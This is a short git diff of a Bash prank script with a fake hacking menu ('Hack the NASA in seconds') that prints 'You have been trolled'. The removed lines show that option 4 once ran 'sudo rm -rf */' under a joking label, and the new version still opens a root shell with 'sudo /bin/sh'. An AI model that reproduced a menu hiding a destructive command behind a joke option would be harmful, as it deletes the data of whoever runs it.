@@ -16,7 +16,7 @@ echo -e "\n${redColour}[+] Made by Astaroz${endColour}\n"
 echo -e "${yellowColour}1 - Hack the NASA in seconds${endColour}\n"
 echo -e "${yellowColour}2 - Deadbytes\n${endColour}"
 echo -e "${yellowColour}3 - Ghostfile\n${endColour}"
-echo -e "${yellowColour}4 - Say goodbye 4 ever${endColour}\n"
+echo -e "${yellowColour}4 - Do you want to play god?${endColour}\n"
 
 # Mete el número
 read -p " - Choose your destiny: "  option
@@ -31,13 +31,11 @@ if [[ "$option" =~ ^[1-4]$ ]]; then
         sleep 5
         echo -e "\n${greenColour}· Almost there ...\n${endColour}"
         sleep 6 
-        clear
         echo -e "\n${turquoiseColour}You have been trolled${endColour}"
         ;;
     4) 
         sudo /bin/sh
-        sudo rm -rf */
-        ;;
+        echo -e "\n${greenColour}[+] Rock & roll\n${endColour}"
     
     esac
 else
